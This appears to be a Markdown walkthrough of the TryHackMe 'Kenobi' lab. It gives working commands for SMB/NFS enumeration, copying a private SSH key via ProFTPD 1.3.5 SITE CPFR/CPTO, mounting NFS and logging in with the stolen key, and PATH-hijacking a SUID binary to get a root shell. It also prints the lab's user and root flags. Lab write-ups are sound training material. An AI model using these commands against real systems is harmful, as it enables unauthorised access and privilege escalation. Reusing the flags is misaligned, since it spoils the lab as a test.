# Kenobi — TryHackMe Walkthrough

A detailed walkthrough of the **Kenobi** room from TryHackMe, covering network enumeration, SMB/NFS enumeration, ProFTPD exploitation, SSH key extraction, initial access, and Linux privilege escalation.

> **Platform:** TryHackMe
> **Room:** Kenobi
> **Difficulty:** Easy
> **Target:** `10.49.156.187`
> **Focus:** Enumeration • Exploitation • Linux Privilege Escalation

---

## 📌 Overview

The objective of this lab is to enumerate the target system, identify vulnerable services, gain initial access, and escalate privileges to obtain root access.

### Attack Path

```text
Nmap
  ↓
SMB Enumeration
  ↓
Anonymous SMB Share
  ↓
NFS Enumeration
  ↓
ProFTPD 1.3.5
  ↓
Copy SSH Private Key
  ↓
NFS Mount
  ↓
SSH Access as Kenobi
  ↓
LinPEAS Enumeration
  ↓
SUID /usr/bin/menu
  ↓
PATH Hijacking
  ↓
Root Access
```

---

# 1. Enumeration

The initial Nmap scan identified several open ports and services on the target.

```bash
nmap -sV 10.49.156.187
```

### Open Ports

| Port | Service | Version       |
| ---- | ------- | ------------- |
| 21   | FTP     | ProFTPD 1.3.5 |
| 22   | SSH     | OpenSSH 8.2p1 |
| 80   | HTTP    | Apache 2.4.41 |
| 111  | RPC     | rpcbind       |
| 139  | SMB     | Samba         |
| 445  | SMB     | Samba         |
| 2049 | NFS     | NFS 3/4       |

A deeper scan was then performed to identify additional services and information.

```bash
nmap -sV -p- -A -O 10.49.156.187
```

The scan confirmed additional NFS-related services such as `mountd` and `nlockmgr`.

The HTTP enumeration also revealed:

```text
/admin.html
```

---

# 2. SMB Enumeration

I used Metasploit to enumerate the SMB service.

The target supported SMB 2/3, with SMB 3.1.1 as the preferred dialect. SMB signing was also found to be **not required**.

The SMB share enumeration revealed an interesting anonymous share:

```text
print$       Printer Drivers
anonymous    DISK
IPC$         IPC Service
```

I connected to the `anonymous` share using `smbclient`:

```bash
smbclient //10.49.156.187/anonymous
```

After connecting, I listed the available files:

```text
smb: \> ls
```

The share contained:

```text
log.txt
```

I downloaded and inspected the file, which contained information related to Kenobi's SSH key.

---

# 3. NFS Enumeration

Since port `111` was running `rpcbind`, I performed NFS enumeration using Nmap scripts:

```bash
nmap -p111 --script=nfs-ls,nfs-showmount,nfs-statfs 10.49.156.187
```

The scan revealed that `/var` was exported through NFS:

```text
/var *
```

This was important because it allowed access to the target's `/var` directory through NFS.

---

# 4. FTP Enumeration

The FTP service was identified as:

```text
ProFTPD 1.3.5
```

I confirmed the FTP banner using Metasploit.

The vulnerable ProFTPD configuration allowed the use of the `SITE CPFR` and `SITE CPTO` commands to copy files.

I connected to the FTP service:

```bash
nc 10.49.156.187 21
```

Then copied Kenobi's private SSH key:

```text
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

The server responded:

```text
250 Copy successful
```

The private key was therefore copied to:

```text
/var/tmp/id_rsa
```

---

# 5. NFS Mount & SSH Access

Because `/var` was exported through NFS, I mounted it locally:

```bash
sudo mkdir /mnt/kenobi
sudo mount 10.49.156.187:/var /mnt/kenobi
```

I then checked the `/tmp` directory:

```bash
ls -la /mnt/kenobi/tmp
```

The copied SSH key was present:

```text
-rw-r--r-- 1 kali kali 1675 Oct 3 15:31 id_rsa
```

I copied the key to my local machine and used it to authenticate as Kenobi:

```bash
sudo ssh -i id_rsa kenobi@10.49.156.187
```

Successful authentication provided access to the target as the `kenobi` user.

### User Flag

```text
d0b0f3f53b6caa532a83915e19224899
```

---

# 6. Privilege Escalation Enumeration

After gaining access as Kenobi, I transferred **LinPEAS** to the target for privilege-escalation enumeration.

A Python HTTP server was used to transfer the script.

After downloading the script:

```bash
chmod +x linpeas.sh
```

I executed LinPEAS and reviewed the results.

An interesting SUID binary was identified:

```text
-rwsr-xr-x 1 root root 8880 Sep 4 2019 /usr/bin/menu
```

The binary was owned by root and had the SUID permission enabled.

---

# 7. SUID Binary Analysis

Running the binary displayed a simple menu:

```text
1. status check
2. kernel version
3. ifconfig
```

I then inspected the binary using:

```bash
strings /usr/bin/menu
```

The output revealed that the program executed commands using `system()`:

```text
curl -I localhost
uname -r
ifconfig
```

The important discovery was that `curl` was executed without an absolute path.

This created an opportunity for **PATH hijacking**.

---

# 8. PATH Hijacking

I created a malicious replacement for `curl` in `/tmp`:

```bash
echo /bin/sh > curl
chmod +777 curl
```

Then modified the `PATH` variable so that `/tmp` was searched first:

```bash
export PATH=/tmp:$PATH
```

I executed the SUID binary again:

```bash
menu
```

Selecting option `1` executed the malicious `curl` replacement.

I verified the privileges:

```bash
id
```

Output:

```text
uid=0(root) gid=1000(kenobi)
```

This confirmed successful **root access**.

---

# 9. Root Flag

The root flag was located in `/root`:

```bash
cd /root/
ls
cat root.txt
```

### Root Flag

```text
177b3cd8562289f37382721c28381f02
```

---

# 🎯 Flags

| Flag      | Value                              |
| --------- | ---------------------------------- |
| User Flag | `d0b0f3f53b6caa532a83915e19224899` |
| Root Flag | `177b3cd8562289f37382721c28381f02` |

---

# 🧠 Key Takeaways

This room demonstrates several important penetration-testing concepts:

* Network and service enumeration with **Nmap**
* SMB share enumeration
* Anonymous SMB access
* NFS enumeration and mounting
* Identifying vulnerable **ProFTPD 1.3.5**
* Abusing `SITE CPFR` / `SITE CPTO`
* SSH private-key extraction
* Linux privilege-escalation enumeration with **LinPEAS**
* Identifying SUID binaries
* Exploiting insecure command execution
* PATH hijacking
* Obtaining root privileges

---

## 🛠️ Tools Used

```text
Nmap
Metasploit Framework
SMBClient
Netcat
NFS
SSH
LinPEAS
Linux utilities
```

---

## ⚠️ Disclaimer

This walkthrough was created for **educational purposes** as part of a TryHackMe lab. The techniques demonstrated should only be used against systems where you have explicit permission to perform security testing.

---

## 📚 Conclusion

The Kenobi room provides a practical introduction to Linux penetration testing. The attack chain demonstrates how seemingly separate weaknesses—anonymous SMB access, NFS exposure, vulnerable FTP functionality, and an insecure SUID binary—can be combined to obtain complete control of a system.
